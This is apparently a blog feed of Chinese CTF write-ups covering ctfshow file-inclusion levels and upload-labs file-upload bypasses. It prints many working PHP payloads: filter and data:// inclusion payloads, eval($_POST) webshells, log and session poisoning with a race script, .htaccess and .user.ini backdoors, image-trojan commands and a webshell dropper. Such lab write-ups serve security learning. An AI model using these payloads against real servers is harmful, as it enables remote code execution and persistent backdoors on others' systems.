        <content type="html"><![CDATA[<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>看源码：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/110856.png" class=""><p>直接构造?file&#x3D;flag.php，没有结果，因为只是包含了php文件，而php代码是不会显示在前端的</p><p>1.可以使用php:&#x2F;&#x2F;filter伪协议：</p><pre><code>payload：?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>2.bp抓包，给file传参?file&#x3D;php:&#x2F;&#x2F;input然后在post输出想要执行的代码</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/150032.png" class=""><p>3.也可以用data伪协议</p><pre><code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;?file=data://text/plain,&lt;?=eval($_POST[1])?&gt;</code></pre><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>这一关用???代替了php</p><p>1.使用data协议：</p><pre><code>?file=data://text/plain,&lt;?Php system(&#39;tac flag.php&#39;);?&gt; //注意&lt;?php第一个p大写?file=data://text/plain,&lt;?= system(&#39;tac flag.php&#39;);?&gt; ?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=</code></pre><p>2.php:&#x2F;&#x2F;input伪协议</p><pre><code>?file=Php://input再post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></pre><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>php和data都被替换了</p><p>1.php:&#x2F;&#x2F;input伪协议（大小写绕过）</p><pre><code>?file=Php://input再post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></pre><p>2.日志文件包含，伪造UA写入php代码</p><p>日志文件记录了服务器收到的每一次请求的</p><p>IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</p><p>nginx日志文件在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>先写入日志：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/201035.png" class=""><p>再包含日志，执行代码：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class=""><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>这道题过滤了冒号，所以远程文件包含和大小写绕过不行了，只能用日志包含，同上题</p><h3 id="web82-session文件包含"><a href="#web82-session文件包含" class="headerlink" title="web82-session文件包含"></a>web82-session文件包含</h3><p>参考<a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">https://blog.csdn.net/qq_46918279/article/details/120106832</a></p><pre><code class="markdown">PHP里面唯一我们能控制的没有后缀的文件就是session文件利用PHP_SESSION_UPLOAD_PROGRESS写入session文件加条件竞争达到文件包含的目的1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on（默认开启）3. session.upload_progress.prefix = &quot;upload_progress_&quot;（默认）4. session.upload_progress.name = &quot;$PHP_SESSION_UPLOAD_PROGRESS&quot;（默认）enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控也就是PHP_SESSION_UPLOAD_PROGRESS的值可控；prefix+name将表示为session中的键名</code></pre><pre><code class="markdown">大体思路为：1、post一个与ini中设置的session.upload_progress.name的同名变量（默认的name为“PHP_SESSION_UPLOAD_PROGRESS”），那么就会返回上传文件的实时进度并写入session文件中。session文件的内容为:（它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值）2、如果我们post传递PHP_SESSION_UPLOAD_PROGRESS的值为一句话木马比如为：&lt;?php system(&#39;ls&#39;);?&gt;3、同时，我们在cookie里面设置名字：PHPSESSID，值：flag，（目的是设置session文件，因为这样我们才能知道实时进度（一句话木马）上传到哪里了）；那么在/tem/sess_flag这个文件的内容就为upload_progress_&lt;?php system(&#39;ls&#39;)?&gt;。然后在include（/tem/sess_flag）就会执行后面的php代码从而成功执行rce。4、虽然文件上传结束后，php会清空session文件中的内容，但是如果我们边上传边去访问/tem/sess_aaa进行条件竞争，那么就有可能在删除session文件前访问到这个文件。</code></pre><p>我们能够创建session文件的原因：session里有一个默认选项，session.use_strict_mode默认值为off。也就是说此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;aaa，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_aaa”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。这个键值ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_aaa文件里。</p><p>操作：1、先构造一个上传文件的页面，对环境上传一个任意的文件，内容也任意，然后抓包。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://dadcfcfb-217c-4393-817b-acf2a96574b7.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>2、 修改上传文件包</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/233813.png" class=""><p>注意两点：</p><p>（1）设置Cookie：PHPSEESSID&#x3D;flag、这样我们的session就为&#x2F;tmp&#x2F;sess_flag</p><p>（2）设置同名变量PHP_SESSION_UPLOAD_PROGRESS，设置值为我们想要存入session文件的代码。（把第一步中value&#x3D;123的改掉即可，这里对123加上§§是为了进行爆破payload用）<br>3、包含session文件，抓包</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/234110.png" class=""><p>这里§a§是为了方便爆破用</p><p>4、进行爆破</p><p>payload数量可以设置10000次，也可以使用无数次。</p><p>设置线程数（用了30）</p><p>然后一起爆破（先对上传文件包点击attack，在对&#x2F;tmp&#x2F;sess_flag文件包含包点击attack，也可以不管顺序，因为爆破次数有很多）</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/235457.png" class=""><p> 最后将ls改成tac fl0g.php就行 </p><h3 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h3><p><strong>session_unset();</strong><br>释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的sessionid<br><strong>session_destroy();</strong><br>删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留<br>所以这两个函数等同于将内存中的$_SESSION变量释放且删除了session文件和释放sessionid，我们是无法进行session文件包含的。但是：我们的脚本或者bp仍然能够进行包含。原因在于多线程竞争：</p><pre><code class="markdown">什么是多线程竞争线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。怎么解决多线程竞争问题?---锁锁的好处: 确保了某段关键代码(共享数据资源)只能由一个线程从头到尾完整地执行能解决多线程资 源竞争下的原子操作问题。锁的坏处: 阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下 降了锁的致命问题: 死锁 </code></pre><h3 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h3><p>system(“rm -rf &#x2F;tmp&#x2F;*”)会强制删除&#x2F;tmp&#x2F;下的所有文件</p><p>还是web82的方法，多线程竞争理解</p><h3 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h3><p>file_exists — 检查文件或目录是否存在,如果由指定的文件或目录存在则返回 true，否则返回 false。</p><p>file_get_contents — 将整个文件读入一个字符串,函数返回读取到的数据， 或者在失败时返回 false。</p><p>strpos — 查找字符串首次出现的位置,返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。如果没找到 needle，将返回 false。</p><p>还是web82的方法、同样的道理：多线程竞争理解</p><h3 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h3><p>知识点：</p><pre><code class="markdown">define — 定义一个常量dirname：返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（&#39;.&#39;），表示当前目录。否则返回的是把 path 中结尾的/component（最后一个斜线以及后面部分）去掉之后的字符串。set_include_path — 设置include函数中 include_path 配置选项，成功时返回旧的 include_path或者在失败时返回 false。include被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告；这一点和require 不同，后者会发出一个致命错误。如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 \ 开头，在 Unix/Linux 下以 / 开头）还是当前目录的相对路径（以 . 或者 .. 开头）——include_path都会被完全忽略。例如一个文件以 ../ 开头，则解析器会在当前目录的父目录下寻找该文件。</code></pre><p>还是web82的方法、同样的道理：多线程竞争理解</p><p>因为设置了目录&#x2F;tmp&#x2F;sess_flag，所以set_include_path对我们的脚本没有用。</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><pre><code class="php">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    $content = $_POST[&#39;content&#39;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>参考<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">谈一谈php:&#x2F;&#x2F;filter的妙用</a></p><p>​<a href="https://xz.aliyun.com/t/8163#toc-3">file_put_content和死亡·杂糅代码之缘</a></p><p>方法1：base64编码</p><p>这道题，向文件输入内容的时候会在开头写入死亡函数，从而导致直接结束代码的执行，我们要做的就是绕过这个死亡函数。</p><p>编码时，转换成Base64的最小单位就是3个字节</p><p>解码时，4个字节为一组；PHP在解码base64时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64的字符选用了”A-Z、a-z、0-9、+、&#x2F;“ 64个可打印字符）所以，通过base64解码过滤之后就只有 phpdie6  个字符我们就要添加2个字符让phpdie和我们增加的两个字符组合起来进行解码。即可抹掉死亡函数。</p><p>其次：因为filename那里需要urldecode，而get传参的时候会进行一次urldecode，所以我们的filename需要两次urlencode。?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php这里需要进行url全编码，不然php会被过滤掉。<br>将&lt;?php eval($_POST[1]);?&gt;进行base64编码为：PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+，注意如果直接传入content，这里的+会被当做空格处理，所以在base64解码的时候就会忽略空格，自动在后面加上一个&#x3D;：即PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8&#x3D;，解码后：&lt;?php eval($_POST[1]);?   这样传进去就会报错</p><p>解决方法：将+进行urlencode或直接去掉?&gt;</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class=""><p>方法2：rot13编码</p><p>条件：在PHP不开启short_open_tag（短标签）时</p><pre><code>payload:?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30//?file=php://filter/write=string.rot13/resource=3.php//对写的内容进行rot13编码。content=&lt;?cuc riny($_CBFG[1]);?&gt;//&lt;?php eval($_POST[1]);?&gt;//rot13两次解码后会变成原来的样子。所以我们将传入的content进行一次rot13编码，然后在写入3.php的时候在进行rot13编码，那么写入文件的时候就会写入&lt;?php eval($_POST[1]);?&gt;。//而&lt;?php die(&#39;大佬别秀了&#39;);?&gt;只会进行一次rot13编码，写入文件的时候就不是一个正常的php代码格式。</code></pre><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>这关过滤了很多，但有个data没有过滤</p><pre><code>data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8%2B //+号可以用%2b编码data://text/plain;base64,&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>misc,看起来比较麻烦，先放着</p><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌</a></p><p>这关没有过滤php，那么我们就可以通过php:&#x2F;&#x2F;filter&#x2F;write来写入文件，然后通过编码绕过死亡函数，因为这里过滤了base64和rot13，string，所以得用其他的编码。</p><pre><code>convert.iconv.这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 然而 我们可以留意到 iconv — 字符串按要求的字符编码来转换;;其用法：iconv ( string $in_charset , string $out_charset , string $str ) : string 将字符串 str 从 in_charset 转换编码到 out_charset。 就其功能而论，有点类似于base_convert的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；</code></pre><p><strong>usc-2</strong>编码：这个是将前后两个字符进行交替(abcd&#x3D;&#x3D;&gt;badc)，所以写入文件的&lt;?php die();?&gt;就会被扰乱，从而绕过。</p><pre><code>get: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.phppost:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?然后访问1.php post:1=system(&#39;tac f*&#39;);</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传(upload-labs)</title>
      <link href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"/>
      <url>/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/</url>
      
        <content type="html"><![CDATA[<h3 id="Pass01Javascript-前端检查"><a href="#Pass01Javascript-前端检查" class="headerlink" title="Pass01Javascript 前端检查"></a>Pass01Javascript 前端检查</h3><p>前端js限制，一般都是通过 JS 限制上传的文件类型，对于这种情况，我们可以采用以下几种方式绕过</p><p>1、禁用js</p><p>2、上传png后缀的webshell，代理抓包，修改上传的文件后缀 </p><p>​这里可能会遇到一个问题，burpsuite会抓不到包。这时我们只需把127.0.0.1改为本机IPv4的地址。</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/154309.png" class=""><p>3、修改JS文件</p><p>右键—查看网站源代码—全部复制—创建一个记事本—将代码放进去—把记事本后缀名改为.html—用Notepad打开—找到js代码—删除</p><p>如果我们打开，是有上传文件的界面，但是不知道要上传给谁。这时我们返回到最开始，右键—检查—网络—然后上传一个正常的图片。这样我们就可以看到这个文件传给谁了。</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/155607.png" class=""><p>然后我们在用Notepad打开我们自己的html文件，修改action,这个action是告诉他这个图片提交给谁，因为这个源代码中没有，我们就自己加一个。最后用浏览器打开我们的html文件，上传。php文件即可。</p><h3 id="Pass02文件类型检查有缺陷"><a href="#Pass02文件类型检查有缺陷" class="headerlink" title="Pass02文件类型检查有缺陷"></a>Pass02文件类型检查有缺陷</h3><p>文件类型检查有缺陷（检查Content-Type标头是否与MIME 类型匹配）</p><p>上传php抓包，将Content-Type修改为允许上传的类型（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/164003.png" class=""><h3 id="Pass03黑名单限制不完全"><a href="#Pass03黑名单限制不完全" class="headerlink" title="Pass03黑名单限制不完全"></a>Pass03黑名单限制不完全</h3><p>对于黑名单限制上传文件后缀的 可以通过以下几种方式绕过</p><ol><li><p>通过使用可被执行但不常见的后缀名，比如 php5,shtml,phps,pht,phtml等等</p></li><li><p>上传恶意的配置文件（Apache .htaccess） 欺骗服务器将任意自定义文件扩展名映射到可知执行的MIME类型</p></li><li><p>利用后端解析差异绕过限制</p></li><li><ol><li>添加尾随字符，一些组件会去除或忽略尾随空格、点等：exploit.php. &#x2F;exploit.php+空格</li><li>对点，斜杠 使用URL 编码， 如果验证文件扩展名时没有解码，在服务端被解码，绕过黑名单限制， exploit%2Ephp</li><li>在文件扩展名前添加分号或 URL 编码的空字节字符。如果验证是用 PHP 或 Java 等高级语言编写的，但服务器使用 C&#x2F;C++ 中的低级函数处理文件，例如，这可能会导致文件名结尾出现差异：exploit.asp;.jpg或exploit.asp%00.jpg</li></ol></li></ol><p>这一关上传.php5即可,可以用蚁剑连接，我用的是php5.4.45</p><h3 id="Pass04-htaccess-扩展后缀名"><a href="#Pass04-htaccess-扩展后缀名" class="headerlink" title="Pass04 .htaccess 扩展后缀名"></a>Pass04 .htaccess 扩展后缀名</h3><p>这一关限制了很多后缀，尝试上传 .htaccess 配置文件，将haha.png图片当作php代码进行解析</p><p>注意：在httpd.conf文件中设置 AllowOverried All ，才能使用.htaccess文件</p><p>首先创建一个.htaccess文件，里面写上代码</p><p>&lt;FilesMatch “haha.png”&gt;<br>SetHandler application&#x2F;x-httpd-php</p><p>&lt;&#x2F;FilesMatch&gt;</p><p>或：</p><p>&lt;FilesMatch “haha”&gt;<br>SetHandler application&#x2F;x-httpd-php</p><p>&lt;&#x2F;FilesMatch&gt;</p><p>然后再上传图片马即可</p><h3 id="Pass05"><a href="#Pass05" class="headerlink" title="Pass05"></a>Pass05</h3><p><strong>解法一：</strong></p><p>这一关的思路是它没有循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。所以我们的绕过思路就很简单，在数据包中把后缀名改为.php.  .说一下他的验证过程，首先他发现有一个点，这时会把他去掉，又发现有一个空格，也会把它去掉，我们这时还有一个点，也就是.php. 由于他只是验证一次，所以不会在去掉我们的点，这时就可以上传成功，也可以解析成功（系统会忽略最后一个点）。</p><p><strong>解法二：.user.ini</strong></p><p>首先上传.user.ini文件，文件内容为：<br> auto_prepend_file&#x3D;haha.png</p><p>user.ini文件里的意思是：所有的php文件都自动包含haha.png文件。.user.ini相当于一个用户自定义的php.ini</p><p>接着上传Pass05.png文件，文件内容为：<br> &lt;?php @eval($_POST[‘shell’]);?&gt;</p><p>最后需要访问的是readme.php</p><p>需要条件：</p><ul><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式（phpstudy切换版本，nts就是fastcgi模式）</li><li>上传目录下要有可执行的php文件</li></ul><p>.user.ini可以参考：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p><strong>解法三：</strong></p><p><strong>借助windows平台的正则匹配规则</strong></p><pre><code>如下符号在windows平台下等效果&quot; =&gt; .&gt; =&gt; ?&lt; =&gt; *</code></pre><p>首先随便上传一个xxx.php:.jpg，此时服务器会生成一个xxx.php的空文件，然后，修改数据包文件名为：<code>xxx.&lt;&lt;&lt;</code>，这里在move_uploaded_file($temp_file, ‘..&#x2F;..&#x2F;upload&#x2F;xxx.&lt;&lt;&lt;’)类似与正则匹配，匹配到…&#x2F;..&#x2F;upload&#x2F;xxx.php文件，然后会将此次上传的文件数据写入到xxx.php文件中，这样就成功写入我们的小马了</p><h3 id="Pass06大小写绕过"><a href="#Pass06大小写绕过" class="headerlink" title="Pass06大小写绕过"></a>Pass06大小写绕过</h3><p>服务器端检查后缀时忽略了对大小写的检测，故可以通过大小写混合后缀绕过</p><h3 id="Pass07黑名单限制不完全-空格"><a href="#Pass07黑名单限制不完全-空格" class="headerlink" title="Pass07黑名单限制不完全- 空格"></a>Pass07黑名单限制不完全- 空格</h3><p>这关没有首尾去空。上传php文件，抓包在后面加空格。</p><p>Windows下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点此处会删除末尾的点。</p><p>在Linux上面测试失败，Linux的机制很严格;在Windows上面测试成功！</p><h3 id="Pass08黑名单限制不完全-点"><a href="#Pass08黑名单限制不完全-点" class="headerlink" title="Pass08黑名单限制不完全 - 点"></a>Pass08黑名单限制不完全 - 点</h3><p>这一关黑名单，没有使用deldot()过滤文件名末尾的点，可以使用文件名后加.进行绕过</p><p>同样Linux测试失败。</p><h3 id="Pass09黑名单限制不完全-DATA"><a href="#Pass09黑名单限制不完全-DATA" class="headerlink" title="Pass09黑名单限制不完全 - ::$DATA"></a>Pass09黑名单限制不完全 - ::$DATA</h3><p>这一关黑名单，没有对::D A T A 进 行 处 理 ， 可 以 使 用 : : DATA进行处理，可以使用::DATA绕过黑名单(<strong>仅限windows</strong>)</p><p>上传PHP一句话文件，抓包改后缀haha.php::$DATA（注意访问的时候不要加上::$data）</p><p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名 他的目的就是不检查后缀名。</p><h3 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h3><p>第10关好像和第五关重复了，可以用第五关的方法绕过</p><h3 id="Pass11黑名单限制不完全-双写绕过"><a href="#Pass11黑名单限制不完全-双写绕过" class="headerlink" title="Pass11黑名单限制不完全 - 双写绕过"></a>Pass11黑名单限制不完全 - 双写绕过</h3><p>源码中 使用 str_ireplace 不区分大小写替换，只是替换了一次，我们可以利用双写绕过检查</p><p>上传文件名 ：webshell.pphphp</p><h3 id="Pass12-00截断-GETurl路径可控"><a href="#Pass12-00截断-GETurl路径可控" class="headerlink" title="Pass12-%00截断(GETurl路径可控)"></a>Pass12-%00截断(GETurl路径可控)</h3><p>这一关白名单，最终文件的存放位置是以拼接的方式，可以使用%00截断，但需要php版本&lt;5.3.4，并且magic_quotes_gpc关闭。</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/223357.png" class=""><p>url中的%00（只要是这种%xx）的形式，webserver会把它当作十六进制处理，然后把16进制的hex自动翻译成ascii码值“NULL”,实现了截断</p><h3 id="Pass13-00截断-POST路径可控"><a href="#Pass13-00截断-POST路径可控" class="headerlink" title="Pass13-00截断(POST路径可控)"></a>Pass13-00截断(POST路径可控)</h3><p>和12关区别就在于GET和POST,GET是可以把url自动解码的，但是POST不会</p><p>这里先写一个haha.php(空格)a，写空格是为了便于修改hex</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/225738.png" class=""><p>因为post不会像get对%00进行自动解码，所以需要将%00修改为hex 00</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/225950.png" class=""><h3 id="Pass14文件内容检测"><a href="#Pass14文件内容检测" class="headerlink" title="Pass14文件内容检测"></a>Pass14文件内容检测</h3><p>这一关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件</p><p>使用 图片马 + 文件包含 绕过</p><p><strong>制作图片马上传</strong></p><pre><code>Linux下：cat 1.png 1.php &gt; 2.pngWindows下：copy 1.png /b + 1.php /a 2.png</code></pre><pre><code>补充知识：1.Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。2.Jpg图片文件包括2字节：FF D8。3.Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。4.Bmp图片文件包括2字节：42 4D。即为 BM。</code></pre><p>我们这里直接可以在图片马开头加上GIF89a</p><p>上传图片马后点击‘文件包含漏洞’链接，然后在url里加上?file&#x3D;upload&#x2F;xxxxxxxx.gif即可</p><h3 id="Pass15"><a href="#Pass15" class="headerlink" title="Pass15"></a>Pass15</h3><p><strong>image_type_to_extension</strong> 根据指定的图像类型返回对应的后缀名</p><p>和14关的做法一致</p><h3 id="Pass16"><a href="#Pass16" class="headerlink" title="Pass16"></a>Pass16</h3><p><strong>exif_imagetype()</strong> 判断一个图像的类型,读取一个图像的第一个字节并检查其签名。</p><p>本函数可用来避免调用其它 exif函数用到了不支持的文件类型上或和 [$_SERVER’HTTP_ACCEPT’] 结合使用来检查浏览器是否可以显示某个指定的图像。需要开启 php_exif模块</p><p>和14关做法一致</p><h3 id="Pass17二次渲染绕过"><a href="#Pass17二次渲染绕过" class="headerlink" title="Pass17二次渲染绕过"></a>Pass17二次渲染绕过</h3><p><strong>imagecreatefromjpeg（）函数</strong> 二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符&#x2F;图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。</p><p>imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。</p><p>所以二次渲染绕过就是把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分。</p><p>这里有个小提示，对于做文件上传之二次渲染建议用GIF图片，相对于简单一点。上传正常的GIF图片下载回显的图片，用编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）并插入PHP一句话，上传带有PHP一句话木马的GIF图片</p><p>可以参考 <a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><h3 id="Pass18条件竞争"><a href="#Pass18条件竞争" class="headerlink" title="Pass18条件竞争"></a>Pass18条件竞争</h3><p>第十八关主要是对条件竞争的考察，我们看代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。</p><p>我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。把木马php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的。</p><p>操作：首先，我们上传PHP文件，我们把木马换一下改为：</p><pre><code>&lt;?php fputs(fopen(&#39;Tony.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;Tony&quot;])?&gt;&#39;);?&gt;</code></pre><p>这样一旦访问到该文件就会在当前目录下生成一个<code>Tony.php</code>的一句话，就不必被删除了。</p><p>用BP拦截</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/192630.png" class=""><p>然后点击<code>Clear$</code>，接着设置无限发送空的<code>Payloads</code>，来让它一直上传该文件</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/193036.png" class=""><p>可以把并发请求数设置高一点</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/193626.png" class=""><p>然后我们写一个python脚本，通过它来不停的访问我们上传上去的PHP文件</p><pre><code class="python">import requestsurl = &quot;http://xxx.xxx.xxx.xxx/upload-labs/upload/haha.php&quot;while True:    html = requests.get(url)    if html.status_code == 200:        print(&quot;OK&quot;)        break</code></pre><p>接下来我们可以在BP点击开始攻击，同时我们也要运行python脚本，当出现OK说明访问到了该文件，那么Tony.php应该也创建成功了。</p><p>参考<a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">https://blog.csdn.net/weixin_47598409/article/details/115050869</a></p><h3 id="Pass19"><a href="#Pass19" class="headerlink" title="Pass19"></a>Pass19</h3><p>第十九关的上传路径有点问题，不是上传到了upload里面，建议修改一下，进入第十九关，找到myupload.php文件，如图所示修改。改完后要重启靶场</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/201031.png" 